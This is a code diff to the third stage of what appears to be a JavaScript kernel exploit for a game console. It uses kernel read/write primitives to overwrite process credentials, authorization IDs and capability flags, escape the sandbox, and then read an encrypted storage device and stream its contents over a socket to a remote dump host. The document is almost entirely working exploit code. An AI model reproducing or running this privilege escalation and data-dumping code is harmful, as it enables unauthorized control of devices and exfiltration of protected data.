@@ -1374,6 +1374,10 @@ function stage3() {
   const UTF_OFFSET = 0x8118080;
   const PRISON_OFFSET = 0x2B7B5B0;
   
+  	function get_kaddr(offset) {
+        return kernel_base.add32(offset);
+    }
+  
   /*
   //CORRECT SUPPOSED QA FLAGS
 	00 00 03 01 00 00 00 00
@@ -1382,11 +1386,11 @@ function stage3() {
 	//CORRECT SUPPOSED SECURITY FLAGS
 	17 00 00 00 00 00 00 01
   */
-  alert("authid: "  + kernel_read8(proc_ucred.add32(0x58)));
+  let prison0 =  kernel_read8(get_kaddr(PRISON_OFFSET));
+  alert("prison1: "  + kernel_read8(proc_ucred.add32(0x30)));
+  alert("prison2: "  + prison0);
   
-	function get_kaddr(offset) {
-        return kernel_base.add32(offset);
-    }
+
   
 	// Set security flags
 	let security_flags =  kernel_read4(get_kaddr(SFF_OFFSET));
@@ -1407,6 +1411,8 @@ function stage3() {
 	 kernel_write4(proc_ucred.add32(0x14), 0); // cr_rgid
 
 	// Escalate sony privs
+	
+	 kernel_write8(proc_ucred.add32(0x30), prison0); // cr_sceAuthId
 	 kernel_write8(proc_ucred.add32(0x58), new int64(0x00000010, 0x48000000)); // cr_sceAuthId
 	 kernel_write8(proc_ucred.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
 	 kernel_write8(proc_ucred.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
@@ -1433,8 +1439,8 @@ function stage3() {
     debug_log("[+] we escaped now? in sandbox: " + is_in_sandbox);
   
 
-  alert("authid: " + kernel_read8(proc_ucred.add32(0x58)));
-  
+  alert("prison3: " + kernel_read8(proc_ucred.add32(0x30)));
+/*  
   let dump_addr = get_kaddr(0x50F3C00);
   let dump_page = p.malloc(0x1000);
 
@@ -1455,11 +1461,11 @@ function stage3() {
   }
 
   // end dump code
-  
-  /*
+ */ 
 
-  let buf = p.malloc(0x200);
-  let fd = chain.syscall(0x005,"/dev/sflash0s1.cryptx3b", 0);//open O_RDONLY
+
+  let buf = p.malloc(0x1000);
+  let fd = chain.syscall(0x005,"/dev/da0x12.crypt", 0);//open O_RDONLY
   if(fd.low == 0xffffffff){
     alert("failed to open, error -1");
   }
@@ -1470,8 +1476,8 @@ function stage3() {
   let connect_res = chain.syscall(0x062, dump_sock_fd, dump_sock_addr_store, 0x10);//connect
   alert("connected dump sock? 0x" + connect_res);
 
-  for (let pfn = 0; ; pfn++) {
-      let read = chain.syscall(0x003, fd, buf, 0x200);//read
+  for (let pfn = 0; pfn <= 0x32EC8 ; pfn++) {
+      let read = chain.syscall(0x003, fd, buf, 0x1000);//read
     let write = chain.syscall(0x004, dump_sock_fd, buf, read);//write
     
   if(pfn == 0){  
@@ -1493,7 +1499,7 @@ function stage3() {
     }
   }
   }
-*/
+
 
 
   // end dump code
